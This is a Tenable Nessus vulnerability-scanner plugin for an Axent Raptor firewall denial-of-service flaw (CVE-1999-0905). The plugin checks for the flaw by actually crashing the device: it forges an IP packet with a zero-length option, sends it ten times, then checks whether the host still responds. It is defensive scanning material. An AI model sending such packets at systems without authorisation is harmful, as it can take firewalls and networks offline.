#
# (C) Tenable Network Security, Inc.
#

# THIS SCRIPT WAS NOT TESTED !
#

include("compat.inc");

if (description)
{
 script_id(10022);
 script_version("$Revision: 1.28 $");
 script_cvs_date("$Date: 2014/05/25 01:17:39 $");

 script_cve_id("CVE-1999-0905");
 script_bugtraq_id(736);
 script_osvdb_id(1121);

 script_name(english:"Axent Raptor Firewall Zero Length IP Remote DoS");
 script_summary(english:"Crashes an axent raptor");

 script_set_attribute(attribute:"synopsis", value:"It is possible to crash the remote device");
 script_set_attribute(attribute:"description", value:
" It is possible to make the remote Axent raptor freeze by sending it a
IP packet containing special options (of length equals to 0)

An attacker may use this flaw to make the remote firewall crash
continuously, thus preventing the network from working properly.");
 script_set_attribute(attribute:"solution", value:
"Filter the incoming IP traffic containing IP options, and contact
Axent for a patch");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"1999/10/20");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/10/30");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");
 script_family(english:"Firewalls");

 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if ( TARGET_IS_IPV6 ) exit(0);
start_denial();

ip = forge_ip_packet(ip_hl: 5,	 	ip_v : 4,	ip_tos : 123,
		     ip_len : 80, 	ip_id:1234,	ip_off : 0,
		     ip_ttl : 0xff,	ip_p:IPPROTO_TCP,
		     ip_src : this_host());

ipo = insert_ip_options(ip:ip, code:44, length:0, value:raw_string(0x00, 0x01));

tcp = forge_tcp_packet(ip:ipo, th_sport:80, th_dport:80, th_seq:rand(),
		       th_ack:rand(), th_off:5, th_flags:TH_ACK,th_win:8192,
			 th_x2:0, th_urp:0);

send_packet(tcp, pcap_active:FALSE) x 10;
sleep(5);
alive = end_denial();
if(!alive){
  		security_hole(0);
		set_kb_item(name:"Host/dead", value:TRUE);
		}
